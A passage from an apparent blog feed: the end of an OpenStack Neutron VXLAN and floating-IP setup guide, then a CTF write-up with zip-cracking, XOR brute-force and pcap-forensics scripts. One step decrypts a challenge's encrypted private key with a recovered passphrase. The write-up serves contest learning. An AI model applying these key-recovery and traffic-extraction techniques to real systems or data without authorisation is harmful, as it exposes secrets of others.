ebtables</span><br></pre></td></tr></table></figure><p>修改neutron配置，编辑<code>/etc/neutron/neutron.conf</code>文件，主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># DEFAULT 段</span><br><span class="line"># 修改</span><br><span class="line">service_plugins = </span><br><span class="line"># 为</span><br><span class="line">service_plugins = router</span><br><span class="line"># 增加</span><br><span class="line">allow_overlapping_ips = true</span><br><span class="line"># 完整的 DEFAULT 段 应该是这个样子</span><br><span class="line">[DEFAULT]</span><br><span class="line">notify_nova_on_port_status_changes = true</span><br><span class="line">notify_nova_on_port_data_changes = true</span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line">core_plugin = ml2</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">service_plugins = router</span><br><span class="line">allow_overlapping_ips = true</span><br></pre></td></tr></table></figure><p>修改ml2的配置，修改<code>/etc/neutron/plugins/ml2/ml2_conf.ini</code>文件，主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ml2 段</span><br><span class="line"># 修改</span><br><span class="line">type_drivers = flat,vlan</span><br><span class="line">tenant_network_types =</span><br><span class="line">mechanism_drivers = linuxbridge</span><br><span class="line"># 为</span><br><span class="line">type_drivers = flat,vlan,vxlan</span><br><span class="line">tenant_network_types = vxlan</span><br><span class="line">mechanism_drivers = linuxbridge,l2population</span><br><span class="line"># 增加一个新配置段 ml2_type_vxlan 并增加下面内容</span><br><span class="line"># 这个配置是vxlan的范围,官网文档是1:1000,我这里写的是10000,建议大点</span><br><span class="line">[ml2_type_vxlan]</span><br><span class="line">vni_ranges = 1:10000</span><br></pre></td></tr></table></figure><p>下面修改<code>linuxbridge</code>的配置，修改<code>/etc/neutron/plugins/ml2/linuxbridge_agent.ini</code>文件，主要内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vxlan段，默认就一条禁用的配置，修改成下面内容</span><br><span class="line">[vxlan]</span><br><span class="line">enable_vxlan = true</span><br><span class="line">local_ip = 172.16.0.11</span><br><span class="line">l2_population = true</span><br></pre></td></tr></table></figure><p>需要注意的是local_ip这个参数，这个参数需要写新增网卡的ip<br>下面开始编辑<code>l3 agent</code>的配置,配置文件<code>/etc/neutron/l3_agent.ini</code>,下面开始备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/neutron/l3_agent.ini&#123;,.bak&#125;</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/l3_agent.ini.bak &gt; /etc/neutron/l3_agent.ini</span><br></pre></td></tr></table></figure><p>编辑，主要内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">interface_driver = linuxbridge</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart neutron-server neutron-linuxbridge-agent neutron-dhcp-agent neutron-metadata-agent</span><br><span class="line">systemctl <span class="built_in">enable</span> --now neutron-l3-agent.service</span><br></pre></td></tr></table></figure><p>下面开始配置neutron计算网络节点，计算网络节点比较简单只需要修改<code>/etc/neutron/plugins/ml2/linuxbridge_agent.ini</code>文件即可，主要修改内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 修改</span><br><span class="line">[vxlan]</span><br><span class="line">enable_vxlan = false</span><br><span class="line"># 为</span><br><span class="line">[vxlan]</span><br><span class="line">enable_vxlan = true</span><br><span class="line">local_ip = 172.16.0.31</span><br><span class="line">l2_population = true</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart neutron-linuxbridge-agent</span><br></pre></td></tr></table></figure><p>配置好网络组件后还需要去配置仪表盘组件的配置，编辑<code>/etc/openstack-dashboard/local_settings</code>文件，主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">OPENSTACK_NEUTRON_NETWORK = &#123;</span><br><span class="line">    &#x27;enable_router&#x27;: True,</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把仪表的路由器功能打开。<br>全部配置好后需要在仪表中的<code>管理员-》网络-》网络</code>中配置，在创建自助网络的时候就必须有一个外部网络，在之前的provider是已经创建好了，如果没有则需要再创建一个外部网络<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108142512.png"><br>这个网络就是出口，后续创建的所有网络都可以通过他来做nat上网，在<code>项目-》网络-》网络</code>中创建一个VPC网络，具体操作如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108144049.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108144056.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108144142.png"><br>子网的创建，网络地址可以随便写，网关要写网络中的第一位可用地址。创建好子网之后再去创建一个路由与外部网络绑定，在<code>项目-》网络-》路由</code>中新建一个路由，可参考下图<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108144443.png"><br>建好点进去增加一个接口<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108144555.png"><br>此时，通过test网络创建的主机都可以通过这个路由上网，尝试结果如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108144905.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108144939.png"><br>因为是内部的VPC网络所以外部无法直接访问，可以通过关联浮动ip的形式来实现外部访问，在<code>管理员-》网络-》浮动IP-》分配IP给项目</code>中创建一个浮动ip<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108145235.png"><br>资源池就是外部网络，浮动ip地址就是外部的地址，不写就是dhcp，再通过<code>项目-》计算-》实例</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108145344.png"><br>绑定浮动ip<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108145359.png"><br>即可通过分配的10.0.0.202去访问主机。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250108145426.png"></p><h1 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h1><p>参考： <a href="https://www.bilibili.com/video/BV1Mm411U7jM">https://www.bilibili.com/video/BV1Mm411U7jM</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>OpenStack会为每个租户创建一个Vxlan设备进行通信<br>OpenStack中虚拟路由器vRouter是通过网络名称空间和iptables来实现的<br>计算节点上虚拟机想要访问外部，需要通过vxlan隧道网络把流量走到网络的控制节点，通过网络控制节点来访问internet。所以如果网络控制节点宕机的话，计算节点上的虚拟机是无法访问外部的。</p><h2 id="供应商网络结构"><a href="#供应商网络结构" class="headerlink" title="供应商网络结构"></a>供应商网络结构</h2><p>供应商网络的结构图如下，不需要嵌套路由而是在网络名称空间中在物理接口桥接出来一个，然后通过内部dhcp分配ip，直接与外部通信<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250120132339.png"></p><h2 id="VXLAN网络结构"><a href="#VXLAN网络结构" class="headerlink" title="VXLAN网络结构"></a>VXLAN网络结构</h2><p>vxlan网络结构图如下，每套路由的情况是这样的，如果是套了一层路由，并且出口是物理交换机GW的话，则下图的控制节点的172.16.2.254-qrouter最流量会被发到192.168.137.169-qrouter来处理，浮动ip也是要先经过物理接口ens33的。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250120132536.png"></p>]]></content>
    
    
    <summary type="html">FLAT网络
Flat网络，相当于直连到对应网络中，没有套任何一层，所有设备都在同一个广播域中。最开始搭建的供应商网络就是这种形式，直连到对应的一个网络中。这里将讲解如何增加一个Flat网络。
首先先在所有的网络计算节点添加一个网卡(注意搭建的时候控制节点也加上了网络控制节点，虽然不知道用处在哪，但是为了不出问题建议也加上。)

这里添加了一个仅主机模式的网卡，一定是在所有计算节点都添加上。添加上之后开始设置网卡，增加后的网卡名字是ens36，执行下面命令进行配置

1
2
3
4
5
6
7
8
9
10


[root@compute1 ~]# cd /etc/sysconfig/netw</summary>
    
    
    
    <category term="虚拟化平台" scheme="https://blog.boychai.xyz/categories/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0/"/>
    
    
    <category term="开源工具" scheme="https://blog.boychai.xyz/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
    <category term="OpenStack" scheme="https://blog.boychai.xyz/tags/OpenStack/"/>
    
    <category term="Stein" scheme="https://blog.boychai.xyz/tags/Stein/"/>
    
    <category term="VXLAN" scheme="https://blog.boychai.xyz/tags/VXLAN/"/>
    
    <category term="FLAT" scheme="https://blog.boychai.xyz/tags/FLAT/"/>
    
  </entry>
  
  <entry>
    <title>2024春秋杯冬季赛-WriteUp</title>
    <link href="https://blog.boychai.xyz/2025/01/20/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-WriteUp/"/>
    <id>https://blog.boychai.xyz/2025/01/20/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-WriteUp/</id>
    <published>2025-01-20T12:11:00.000Z</published>
    <updated>2025-07-17T05:40:18.597Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h1><p><img src="https://image.boychai.xyz/article/24i%E6%98%A5%E7%A7%8B%E5%86%AC%E5%AD%A3%E8%B5%9B%E6%88%90%E7%BB%A9-2.png"><br>个人ID：boychai<br>个人排名：159<br>最终排名：<a href="https://mp.weixin.qq.com/s/Dc1X1xMZlarshTjcGaOgHg">153 还拿了一个Misc金手指，Misc排名为81</a><br>总结： 太难了，PWN有两个是有思路的，但是pwn好久没碰了就没深入解，第一天光卡在<code>ez_forensics</code>题目中了，解到mobax的配置已经拿到了，一直再想办法绕过master的密码，到现在也不知道题解。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="第1天-简单镜像提取"><a href="#第1天-简单镜像提取" class="headerlink" title="第1天 简单镜像提取"></a>第1天 简单镜像提取</h2><p>流15中发现一个压缩包<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117160348.png"><br>提取后拿到一个压缩包 内部有一个img文件<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117160426.png"><br>通过R-Studio工具打开直接有一个文件<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117160520.png"><br>恢复后<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117160543.png"><br>flag{E7A10C15E26AA5750070EF756AAA1F7C}</p><h2 id="第1天-压力大，写个脚本吧"><a href="#第1天-压力大，写个脚本吧" class="headerlink" title="第1天 压力大，写个脚本吧"></a>第1天 压力大，写个脚本吧</h2><p>题目逻辑是压缩包中套压缩包，一共100个，每个都会提前给一个密码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117183940.png"><br>写脚本之后可以拿到<code>flag-hint.txt</code>内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117184027.png"><br>估计密码加起来最终是一个png，这里通过下面脚本可以直接出最终的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_zip</span>(<span class="params">zip_path, output_folder, pass_path, password_log_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 从密码文件读取密码</span></span><br><span class="line">        password = get_password_from_txt(pass_path)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;无法获取密码：<span class="subst">&#123;pass_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取现有日志文件内容</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(password_log_file):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(password_log_file, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> log_file:</span><br><span class="line">                existing_content = log_file.read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            existing_content = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录密码到日志文件的开头</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(password_log_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> log_file:</span><br><span class="line">            log_file.write(<span class="string">f&quot;<span class="subst">&#123;password&#125;</span>\n<span class="subst">&#123;existing_content&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解压ZIP文件</span></span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            zip_ref.setpassword(password.encode())  <span class="comment"># 设置密码</span></span><br><span class="line">            zip_ref.extractall(output_folder)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解压成功：<span class="subst">&#123;zip_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;密码错误或文件损坏：<span class="subst">&#123;zip_path&#125;</span> - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解压过程中出错：<span class="subst">&#123;zip_path&#125;</span> - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_multiple_zips</span>(<span class="params">start_num, end_num, output_folder, password_log_file</span>):</span><br><span class="line">    <span class="comment"># 确保输出文件夹存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_folder):</span><br><span class="line">        os.makedirs(output_folder)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num - <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        zip_filename = <span class="string">f&quot;zip_<span class="subst">&#123;i&#125;</span>.zip&quot;</span></span><br><span class="line">        pass_filename = <span class="string">f&quot;password_<span class="subst">&#123;i&#125;</span>.txt&quot;</span></span><br><span class="line">        zip_path = os.path.join(output_folder, zip_filename)</span><br><span class="line">        pass_path = os.path.join(output_folder, pass_filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果文件存在，解压</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(zip_path):</span><br><span class="line">            decrypt_zip(zip_path, output_folder, pass_path, password_log_file)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在：<span class="subst">&#123;zip_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password_from_txt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从密码文件读取Base64编码的密码并解码&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            encoded_password = file.read().strip()</span><br><span class="line">            decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> decoded_password</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取密码文件出错：<span class="subst">&#123;file_path&#125;</span> - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line">start_num = <span class="number">99</span>  <span class="comment"># 文件名从zip_99开始</span></span><br><span class="line">end_num = <span class="number">0</span>  <span class="comment"># 文件名到zip_1结束</span></span><br><span class="line">output_folder = <span class="string">&quot;extracted_files&quot;</span>  <span class="comment"># 解压到的文件夹</span></span><br><span class="line">password_log_file = <span class="string">&quot;password_log.txt&quot;</span>  <span class="comment"># 保存密码的日志文件</span></span><br><span class="line"></span><br><span class="line">decrypt_multiple_zips(start_num, end_num, output_folder, password_log_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终去<code>password_log.txt</code>中可以拿到一个全部16进制的数据，丢到010中16进制粘贴，改为png格式即可拿到二维码照片。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117184235.png"><br>扫描拿到<code>flag&#123;_PASSWORDs_is_fl@g!_&#125;</code></p><h2 id="第1天-简单算术"><a href="#第1天-简单算术" class="headerlink" title="第1天 简单算术"></a>第1天 简单算术</h2><p>密文为<code>ys~xdg/m@]mjkz@vl@z~lf&gt;b </code><br>脚本直接跑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;ys~xdg/m@]mjkz@vl@z~lf&gt;b &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 128):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.<span class="built_in">join</span>(chr(ord(c) ^ i) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;i=&#123;i&#125;: &#123;result&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250117160220.png"><br> flag{x0r_Brute_is_easy!}</p><h2 id="第2天-NetHttP"><a href="#第2天-NetHttP" class="headerlink" title="第2天 NetHttP"></a>第2天 NetHttP</h2><p>先导出爆破成功的流量，脚本如下，具体的判断方式是返回数据包返回<code>rce</code>即成功，常规的这种爆破流量都是爆破成功后就不爆破了，这里是爆破成功了继续爆破每个字符都要从头到尾尝试一遍，通过下面脚本可以拿到所有相关的爆破成功的数据包，会导出到<code>./output</code>目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">input_pcap=<span class="string">&quot;NetHttP.pcapng&quot;</span></span><br><span class="line"></span><br><span class="line">output_dir=<span class="string">&quot;./output&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$output_dir</span>&quot;</span></span><br><span class="line"></span><br><span class="line">output_prefix=<span class="string">&quot;stream_&quot;</span></span><br><span class="line"></span><br><span class="line">stream_ids=$(tshark -r <span class="string">&quot;<span class="variable">$input_pcap</span>&quot;</span> -Y <span class="string">&#x27;http contains &quot;rce&quot; and ip.dst == 192.168.111.1&#x27;</span> -T fields -e tcp.stream | <span class="built_in">sort</span> -u)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$stream_ids</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;没有找到符合条件的流 ID。&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> stream_id <span class="keyword">in</span> <span class="variable">$stream_ids</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;导出流 <span class="variable">$stream_id</span>...&quot;</span></span><br><span class="line">  tshark -r <span class="string">&quot;<span class="variable">$input_pcap</span>&quot;</span> -Y <span class="string">&quot;tcp.stream eq <span class="variable">$stream_id</span>&quot;</span> -w <span class="string">&quot;<span class="variable">$output_dir</span>/$output_prefix<span class="variable">$stream_id</span>.pcapng&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有流的导出已完成。&quot;</span></span><br></pre></td></tr></table></figure><p>再通过下面命令把数据导出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ~/Desktop/output 导出目录</span></span><br><span class="line"><span class="built_in">cat</span> * |strings |grep <span class="built_in">echo</span> |awk -F <span class="string">&quot;echo%20&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|awk -F <span class="string">&quot;%20&quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">base64</span> -d |  sed <span class="string">&#x27;s/fi/\n/g&#x27;</span> |awk -F <span class="string">&quot;==&quot;</span> <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> |awk -F <span class="string">&quot;&#x27;&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> |sed <span class="string">&#x27;:a;N;$!ba;s/\n//g&#x27;</span></span><br></pre></td></tr></table></figure><p>返回内容为<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118142555.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UzBJM2lXaHZzektiT00vT2FsS1RBMGZwbTVPNWNoVlZuWUd5S2Q1blY0ZXJBelJiVjZWNnc4Yi9VaU9mUUVjM0lqaDAwaEZqWUZVMUhheE51YjlHbmxQUy9sY2FtNW1BVGtmMnNKUzZKZ3BKbzZBU2hWUnhXRFlLS3JvamVVZUJaajVNRVBJOC80REdHR3VIRnhteDJieEFhaGREZTFjR25qVFpHV09OcE5JPQ==RmFrZSBGTGFnCm5vIGhlcmUK</span><br></pre></td></tr></table></figure><p>俩等于号之后的是从<code>/flag</code>中爆破的实际解密内容是假的flag,再看上面的数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118142708.png"><br>解密数据为<code>S0I3iWhvszKbOM/OalKTA0fpm5O5chVVnYGyKd5nV4erAzRbV6V6w8b/UiOfQEc3Ijh00hFjYFU1HaxNub9GnlPS/lcam5mATkf2sJS6JgpJo6AShVRxWDYKKrojeUeBZj5MEPI8/4DGGGuHFxmx2bxAahdDe1cGnjTZGWONpNI=</code>再继续base64会发现都不是明文数据，从流量包尝试找其他内容，http的前几个数据包发现了一个被加密的私钥，如图内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118142825.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN ENCRYPTED PRIVATE KEY-----</span><br><span class="line">MIIC1DBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIirzza4niI8QCAggA</span><br><span class="line">MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECEXSIcOIuwGaBIICgHLW3Qb39/+E</span><br><span class="line">0uKiOi8yevcztF5toCOGsh6Fi23zSIwCjH8VPO1lbpFCkW9789ldbxBbSwtXwMmF</span><br><span class="line">kTyFjOmymL/zktmt8PyExcWOGA481/IkpCPTmKAT8+67FJEdAf9BAZVPjqpu1Lla</span><br><span class="line">Ohnp3JFZ8SStSUWwvjLZafi4Ucf7ajJexwCTkkvB7mF8kostYaBOsNJ1GORRdL3c</span><br><span class="line">s73GxvX98MTLvF1DW5xujgdcl28msB3GHTxe7sSgScKfFUyfCViivW8FCqa6lfJo</span><br><span class="line">Tj3JZtNlpPiOr1PXPfIWBt0wEQaF3+ovTEVu7x1r1Q3mq61GpO3s4n6kdeGg9Dkp</span><br><span class="line">BYErmG76JdZtOWTZ88SrD7EDkh12EOdtM0ywR1DTYk4+fjKifkhPPrIGn8Nm07PE</span><br><span class="line">yTAS7UG0Ut2Ut722rOBsgIZlnk2vF8qbIvKJj1JGzedMLabnafF5/L2N4wP8ZeL8</span><br><span class="line">fO1Asxy0o/Hk89rl7ZI8Aocc1ZRMHKfxg/XV2bFHv2q1M1y3CI9wUrGnvk+8oX0H</span><br><span class="line">T/5vFtfGb4QNiy+p6aTi+UEJOau5O0t4f2kAL6L/pgmLEMulKWVMK8u+p6os0cbt</span><br><span class="line">KbVBmjNE/uA8SCv8E9XcL+/LWsSVInrYwJQzWbLIYx5FTRk4479taV3BGEN+hbmU</span><br><span class="line">RqlIK8IwsVxWc4wC+oHoLMY4RllUZ9D2rBasMt6DOLA31Jjrabciv03zJPyqXcfi</span><br><span class="line">DVTFu9JfT1fF7eOClQzTvIlTDVIDMPfAqR6B+/AbZDiQ2aK/54i10kohmXT2qWoT</span><br><span class="line">pDYPWV2JGTXICaRyP8FYu26ZTdIKVB3PovfJEXR3yex14U5T8zFVpUQnoDJfNyPG</span><br><span class="line">qUVmlGScmkU=</span><br><span class="line">-----END ENCRYPTED PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>这是个被加密的私钥，找了好久的密钥发现了一个最像密钥的字符串<code>gdkfksy05lx0nv8dl</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250118142947.png"><br>尝试通过下面命令解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;gdkfksy05lx0nv8dl&quot;</span> | openssl rsa -<span class="keyword">in</span> key.pem -out decrypted_private_key.pem -passin stdin</span><br></pre></td></tr></table></figure><p>拿到私钥<br><img 